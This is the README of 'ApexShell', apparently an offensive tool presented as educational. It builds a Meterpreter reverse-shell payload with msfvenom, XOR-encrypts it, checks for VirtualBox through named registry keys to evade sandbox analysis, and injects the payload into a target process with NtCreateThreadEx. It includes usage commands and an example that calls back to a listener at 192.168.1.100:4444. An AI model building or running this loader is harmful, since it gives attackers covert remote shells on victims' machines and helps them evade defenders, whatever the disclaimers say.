# ApexShell

## Purpose
**ApexShell** is an educational tool demonstrating process injection, XOR encryption, and VirtualBox anti-VM techniques. **For educational use only in authorized environments.** Unauthorized use is illegal.

## Disclaimer
Use only on systems you own or have explicit permission to test. The developers are not liable for misuse.

## Project Structure
```
APEXSHELL
├── build/
│   └── hack.bin                  # Generated raw payload
├── src/
│   ├── injector.cpp              # Process injection code
│   └── temp_secure_injector.cpp  # Temporary C++ file
└── ApexShell.py                  # Payload generation script
```

## Features
- Generates Windows x64 Meterpreter reverse shell with `msfvenom`.
- Encrypts payload with XOR.
- Detects VirtualBox via registry checks.
- Injects payload using `NtCreateThreadEx`.

## Prerequisites
- Python 3.x
- Metasploit Framework (`msfvenom`)
- MinGW-w64 (`x86_64-w64-mingw32-g++`)

## Installation
1. Clone/download the project.
2. Install Metasploit and MinGW-w64:
   ```bash
   sudo apt-get install mingw-w64 metasploit-framework 
   ```

## Usage
```bash
python ApexShell.py -l <LHOST> -p <LPORT> [-o <OUTPUT_EXE>]
```
- `-l, --lhost`: Listening host IP (required).
- `-p, --lport`: Listening port (required).
- `-o, --output`: Output executable (default: `secureshell.exe`).
- `-h, --help`: Show help.

### Example
```bash
python ApexShell.py -l 192.168.1.100 -p 4444 -o build/myshell.exe
```

Run injector:
```bash
.\myshell.exe <PID>
```

## How It Works
1. **Payload Generation**: Creates and encrypts reverse shell with XOR.
2. **Compilation**: Embeds payload/key into C++ template and compiles.
3. **Injection**: Injects payload into target process with anti-VM checks.

## Anti-VM Checks
Detects VirtualBox via:
- `HKEY_LOCAL_MACHINE\HARDWARE\ACPI\FADT\VBOX__`
- `SystemProductName` and `BiosVersion` in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation`

## Troubleshooting
- **msfvenom not found**: Install Metasploit.
- **Compilation errors**: Verify MinGW-w64 setup.
- **Injector fails**: Check PID.

## Educational Goals
Learn:
- Process injection (`VirtualAllocEx`, `NtCreateThreadEx`).
- Payload generation with `msfvenom`.
- XOR encryption.
- Anti-VM registry checks.

## Warning
**Unauthorized use is illegal.** Test only in authorized environments.
